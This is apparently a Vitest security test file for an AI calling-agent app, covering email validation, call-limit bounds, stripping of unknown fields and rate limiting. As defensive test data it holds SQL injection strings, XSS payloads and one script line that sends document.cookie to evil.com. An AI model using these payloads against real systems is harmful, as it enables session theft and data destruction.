/**
 * 19. INPUT VALIDATION & SECURITY — QA Test Cases IV-001 through IV-007
 *
 * Tests input validation and security measures across schemas and middleware.
 */

import { describe, it, expect, vi } from "vitest";
import { z } from "zod";

// ── Mock DB (api-keys.ts transitively imports Prisma) ─────────────────────────
vi.mock("@/lib/db", () => ({ db: {} }));

import { createAgentSchema } from "@/schemas/agent";
import { checkRateLimit } from "@/lib/api-middleware";

// ─── Inline schemas mirroring production definitions ─────────────────────────

/** Mirrors the attendeeEmail field from src/server/routers/appointments.ts */
const appointmentSchema = z.object({
  title: z.string().min(1, "Title is required"),
  scheduledAt: z.string(),
  attendeeEmail: z.string().email("Invalid email format").optional(),
  attendeeName: z.string().optional(),
});

/** Mirrors maxCallsPerDay from src/server/routers/campaigns.ts */
const campaignSchema = z.object({
  name: z.string().min(1, "Name is required").max(100),
  agentId: z.string(),
  maxCallsPerDay: z.number().min(1).max(1000).default(100),
});

const validAgentBase = {
  name: "Test Agent",
  systemPrompt: "You are a helpful AI assistant for customer support.",
};

const validAppointment = {
  title: "Discovery Call",
  scheduledAt: "2025-06-01T10:00:00Z",
};

const validCampaign = {
  name: "Q1 Outreach",
  agentId: "agent-abc123",
};

// ─────────────────────────────────────────────────────────────────────────────

describe("19. INPUT VALIDATION & SECURITY", () => {
  // ── IV-001: Email format validation ──────────────────────────────────────────
  describe("IV-001: Email format validation", () => {
    it("rejects an invalid email — missing @ symbol", () => {
      const result = appointmentSchema.safeParse({
        ...validAppointment,
        attendeeEmail: "notanemail",
      });
      expect(result.success).toBe(false);
      expect(result.error?.errors[0]?.message).toBe("Invalid email format");
    });

    it("rejects an invalid email — missing domain", () => {
      const result = appointmentSchema.safeParse({
        ...validAppointment,
        attendeeEmail: "user@",
      });
      expect(result.success).toBe(false);
    });

    it("rejects an invalid email — missing TLD", () => {
      const result = appointmentSchema.safeParse({
        ...validAppointment,
        attendeeEmail: "user@domain",
      });
      expect(result.success).toBe(false);
    });

    it("rejects an email with spaces", () => {
      const result = appointmentSchema.safeParse({
        ...validAppointment,
        attendeeEmail: "user name@example.com",
      });
      expect(result.success).toBe(false);
    });

    it("accepts a valid email address", () => {
      const result = appointmentSchema.safeParse({
        ...validAppointment,
        attendeeEmail: "user@example.com",
      });
      expect(result.success).toBe(true);
    });

    it("accepts a valid email with subdomain", () => {
      const result = appointmentSchema.safeParse({
        ...validAppointment,
        attendeeEmail: "user@mail.example.co.uk",
      });
      expect(result.success).toBe(true);
    });

    it("accepts a missing email (field is optional)", () => {
      const result = appointmentSchema.safeParse(validAppointment);
      expect(result.success).toBe(true);
    });

    it("rejects a plain SQL injection string as email value", () => {
      // e.g. someone trying "' OR '1'='1" in the email field
      const result = appointmentSchema.safeParse({
        ...validAppointment,
        attendeeEmail: "' OR '1'='1",
      });
      expect(result.success).toBe(false);
    });
  });

  // ── IV-002: SQL injection protection ─────────────────────────────────────────
  // Zod validates types and constraints; Prisma provides parameterized queries.
  // The protection layer is: Zod accepts strings → Prisma parameterizes them.
  // These tests verify string fields accept SQL payloads as plain strings
  // (they are data, not code) and don't crash or mutate the schema.
  describe("IV-002: SQL injection protection", () => {
    const payloads = [
      "'; DROP TABLE agents; --",
      "' OR '1'='1",
      "1; SELECT * FROM users WHERE '1'='1",
      "admin'--",
      "' UNION SELECT null, null, null --",
    ];

    payloads.forEach((payload) => {
      it(`schema treats SQL payload as plain string data: ${payload.substring(0, 30)}`, () => {
        // Zod accepts valid strings — protection is at the Prisma parameterization layer
        const result = createAgentSchema.safeParse({
          ...validAgentBase,
          description: payload, // description is an optional string field
        });
        expect(result.success).toBe(true);
        if (result.success) {
          // The value is stored exactly as-is — no execution
          expect(result.data.description).toBe(payload);
        }
      });
    });

    it("SQL payload in name field is validated as a string (no crash)", () => {
      const result = createAgentSchema.safeParse({
        ...validAgentBase,
        name: "Agent'; DROP TABLE agents;--",
      });
      expect(result.success).toBe(true);
    });

    it("excessively long SQL payload in name field is rejected by max(100)", () => {
      const result = createAgentSchema.safeParse({
        ...validAgentBase,
        name: "A".repeat(101) + "'; DROP TABLE agents; --",
      });
      expect(result.success).toBe(false);
    });

    it("email field rejects SQL payload (fails email format check)", () => {
      const result = appointmentSchema.safeParse({
        ...validAppointment,
        attendeeEmail: "'; DROP TABLE appointments;--",
      });
      expect(result.success).toBe(false);
    });
  });

  // ── IV-003: XSS payload handling ─────────────────────────────────────────────
  // React/Next.js auto-escapes JSX; Zod stores strings as-is (they are data).
  // Tests verify XSS payloads are stored as plain string values, not executed.
  describe("IV-003: XSS payload handling", () => {
    const xssPayloads = [
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert(1)>",
      "javascript:alert(document.cookie)",
      "<svg onload=alert(1)>",
      '"><script>document.body.innerHTML=""</script>',
    ];

    xssPayloads.forEach((payload) => {
      it(`XSS payload stored as string data, not executed: ${payload.substring(0, 40)}`, () => {
        const result = createAgentSchema.safeParse({
          ...validAgentBase,
          description: payload,
        });
        expect(result.success).toBe(true);
        if (result.success) {
          // The raw string is preserved — rendering layer (React) handles escaping
          expect(result.data.description).toBe(payload);
        }
      });
    });

    it("XSS in agent name is stored as plain string (not stripped by schema)", () => {
      const result = createAgentSchema.safeParse({
        ...validAgentBase,
        name: "<b>Bold Agent</b>",
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.name).toBe("<b>Bold Agent</b>");
      }
    });

    it("XSS in system prompt is stored as plain string", () => {
      const payload = "<script>fetch('https://evil.com?c='+document.cookie)</script>";
      const result = createAgentSchema.safeParse({
        ...validAgentBase,
        systemPrompt: payload + " You are a helpful assistant.",
      });
      expect(result.success).toBe(true);
    });

    it("XSS payload in email field is rejected (fails email format)", () => {
      const result = appointmentSchema.safeParse({
        ...validAppointment,
        attendeeEmail: "<script>alert(1)</script>@evil.com",
      });
      expect(result.success).toBe(false);
    });
  });

  // ── IV-004: Max calls per day bounds ─────────────────────────────────────────
  describe("IV-004: maxCallsPerDay bounds — must be 1–1000", () => {
    it("rejects maxCallsPerDay below minimum (0)", () => {
      const result = campaignSchema.safeParse({ ...validCampaign, maxCallsPerDay: 0 });
      expect(result.success).toBe(false);
    });

    it("rejects maxCallsPerDay of -1 (negative)", () => {
      const result = campaignSchema.safeParse({ ...validCampaign, maxCallsPerDay: -1 });
      expect(result.success).toBe(false);
    });

    it("rejects maxCallsPerDay above maximum (1001)", () => {
      const result = campaignSchema.safeParse({ ...validCampaign, maxCallsPerDay: 1001 });
      expect(result.success).toBe(false);
    });

    it("rejects maxCallsPerDay of 9999 (far above limit)", () => {
      const result = campaignSchema.safeParse({ ...validCampaign, maxCallsPerDay: 9999 });
      expect(result.success).toBe(false);
    });

    it("accepts maxCallsPerDay at lower boundary (1)", () => {
      const result = campaignSchema.safeParse({ ...validCampaign, maxCallsPerDay: 1 });
      expect(result.success).toBe(true);
    });

    it("accepts maxCallsPerDay at upper boundary (1000)", () => {
      const result = campaignSchema.safeParse({ ...validCampaign, maxCallsPerDay: 1000 });
      expect(result.success).toBe(true);
    });

    it("defaults maxCallsPerDay to 100 when not provided", () => {
      const result = campaignSchema.safeParse(validCampaign);
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.maxCallsPerDay).toBe(100);
      }
    });

    it("accepts typical values (50, 100, 200, 500)", () => {
      [50, 100, 200, 500].forEach((val) => {
        expect(
          campaignSchema.safeParse({ ...validCampaign, maxCallsPerDay: val }).success
        ).toBe(true);
      });
    });
  });

  // ── IV-005: Unknown fields stripped ──────────────────────────────────────────
  // Zod's default behavior is .strip() — unrecognised keys are silently removed.
  describe("IV-005: Unknown fields stripped by Zod schema", () => {
    it("strips unknown top-level field from createAgentSchema output", () => {
      const result = createAgentSchema.safeParse({
        ...validAgentBase,
        unknownField: "should be stripped",
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data).not.toHaveProperty("unknownField");
      }
    });

    it("strips multiple unknown fields simultaneously", () => {
      const result = createAgentSchema.safeParse({
        ...validAgentBase,
        __proto__: { isAdmin: true },
        internalId: "id-999",
        secretToken: "tok_secret",
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data).not.toHaveProperty("internalId");
        expect(result.data).not.toHaveProperty("secretToken");
      }
    });

    it("retains all known valid fields after stripping", () => {
      const result = createAgentSchema.safeParse({
        ...validAgentBase,
        voiceSpeed: 1.2,
        unknownExtra: "strip me",
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.name).toBe(validAgentBase.name);
        expect(result.data.voiceSpeed).toBe(1.2);
      }
    });

    it("strips unknown field from campaign schema output", () => {
      const result = campaignSchema.safeParse({
        ...validCampaign,
        internalTrackingId: "track-abc",
        __type: "override",
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data).not.toHaveProperty("internalTrackingId");
        expect(result.data).not.toHaveProperty("__type");
      }
    });

    it("strips prototype pollution attempt fields — no own-property injection", () => {
      const result = createAgentSchema.safeParse({
        ...validAgentBase,
        __isAdmin: true,
        __role: "superadmin",
        __bypass: "true",
      });
      expect(result.success).toBe(true);
      if (result.success) {
        // Zod strips these — they must not be own properties on the output
        expect(Object.hasOwn(result.data, "__isAdmin")).toBe(false);
        expect(Object.hasOwn(result.data, "__role")).toBe(false);
        expect(Object.hasOwn(result.data, "__bypass")).toBe(false);
      }
    });
  });

  // ── IV-006: Rate limiting — User level ───────────────────────────────────────
  describe("IV-006: Rate limiting — user-level requests rejected after limit", () => {
    it("allows requests up to the user limit", () => {
      const userId = `user-${Date.now()}-${Math.random()}`;
      const limit = 5;
      for (let i = 0; i < limit; i++) {
        const result = checkRateLimit(userId, limit, 60_000);
        expect(result.allowed).toBe(true);
      }
    });

    it("blocks requests once the user limit is reached", () => {
      const userId = `user-block-${Date.now()}-${Math.random()}`;
      const limit = 3;
      for (let i = 0; i < limit; i++) checkRateLimit(userId, limit, 60_000);
      const blocked = checkRateLimit(userId, limit, 60_000);
      expect(blocked.allowed).toBe(false);
      expect(blocked.remaining).toBe(0);
    });

    it("decrements remaining count on each user request", () => {
      const userId = `user-dec-${Date.now()}-${Math.random()}`;
      const limit = 10;
      checkRateLimit(userId, limit, 60_000); // 1st → remaining 9
      checkRateLimit(userId, limit, 60_000); // 2nd → remaining 8
      const third = checkRateLimit(userId, limit, 60_000); // 3rd → remaining 7
      expect(third.remaining).toBe(7);
    });

    it("two different users have independent quotas", () => {
      const user1 = `user1-${Date.now()}-${Math.random()}`;
      const user2 = `user2-${Date.now()}-${Math.random()}`;
      const limit = 2;

      // Exhaust user1's quota
      for (let i = 0; i < limit; i++) checkRateLimit(user1, limit, 60_000);
      expect(checkRateLimit(user1, limit, 60_000).allowed).toBe(false);

      // user2 is unaffected
      expect(checkRateLimit(user2, limit, 60_000).allowed).toBe(true);
    });

    it("rate limit window resets after expiry", async () => {
      const userId = `user-exp-${Date.now()}-${Math.random()}`;
      for (let i = 0; i < 2; i++) checkRateLimit(userId, 2, 10);
      expect(checkRateLimit(userId, 2, 10).allowed).toBe(false);

      await new Promise((r) => setTimeout(r, 20));
      expect(checkRateLimit(userId, 2, 10).allowed).toBe(true);
    });

    it("resetAt timestamp is provided for blocked requests", () => {
      const userId = `user-reset-${Date.now()}-${Math.random()}`;
      for (let i = 0; i < 1; i++) checkRateLimit(userId, 1, 60_000);
      const result = checkRateLimit(userId, 1, 60_000);
      expect(result.allowed).toBe(false);
      expect(result.resetAt).toBeGreaterThan(Date.now());
    });
  });

  // ── IV-007: Rate limiting — Organization level ────────────────────────────────
  describe("IV-007: Rate limiting — org-level requests rejected after limit", () => {
    it("allows org-level requests up to the org limit", () => {
      const orgId = `org-${Date.now()}-${Math.random()}`;
      const limit = 50;
      const first = checkRateLimit(`org:${orgId}`, limit, 60_000);
      expect(first.allowed).toBe(true);
      expect(first.remaining).toBe(49);
    });

    it("blocks org-level requests once the org limit is reached", () => {
      const orgId = `org-block-${Date.now()}-${Math.random()}`;
      const limit = 4;
      for (let i = 0; i < limit; i++) checkRateLimit(`org:${orgId}`, limit, 60_000);
      const blocked = checkRateLimit(`org:${orgId}`, limit, 60_000);
      expect(blocked.allowed).toBe(false);
    });

    it("org quota is shared across all users in the org (same identifier)", () => {
      const orgId = `org-shared-${Date.now()}-${Math.random()}`;
      const orgKey = `org:${orgId}`;
      const limit = 3;

      // Simulating user A, user B, user C all hitting the org-level limiter
      checkRateLimit(orgKey, limit, 60_000); // user A's request
      checkRateLimit(orgKey, limit, 60_000); // user B's request
      checkRateLimit(orgKey, limit, 60_000); // user C's request
      // 4th request from anyone in the org is blocked
      const result = checkRateLimit(orgKey, limit, 60_000);
      expect(result.allowed).toBe(false);
    });

    it("org and user identifiers are tracked separately", () => {
      const base = `sep-${Date.now()}-${Math.random()}`;
      const orgKey  = `org:${base}`;
      const userKey = `user:${base}`;
      const limit = 2;

      // Exhaust org quota
      for (let i = 0; i < limit; i++) checkRateLimit(orgKey, limit, 60_000);
      expect(checkRateLimit(orgKey, limit, 60_000).allowed).toBe(false);

      // User-level quota is unaffected
      expect(checkRateLimit(userKey, limit, 60_000).allowed).toBe(true);
    });

    it("org rate limit resets after window expiry", async () => {
      const orgId = `org-win-${Date.now()}-${Math.random()}`;
      const orgKey = `org:${orgId}`;
      for (let i = 0; i < 2; i++) checkRateLimit(orgKey, 2, 10);
      expect(checkRateLimit(orgKey, 2, 10).allowed).toBe(false);

      await new Promise((r) => setTimeout(r, 20));
      expect(checkRateLimit(orgKey, 2, 10).allowed).toBe(true);
    });

    it("org-level rate limiter returns remaining count and resetAt", () => {
      const orgId = `org-meta-${Date.now()}-${Math.random()}`;
      const result = checkRateLimit(`org:${orgId}`, 100, 60_000);
      expect(result.allowed).toBe(true);
      expect(typeof result.remaining).toBe("number");
      expect(result.resetAt).toBeGreaterThan(Date.now());
    });
  });
});
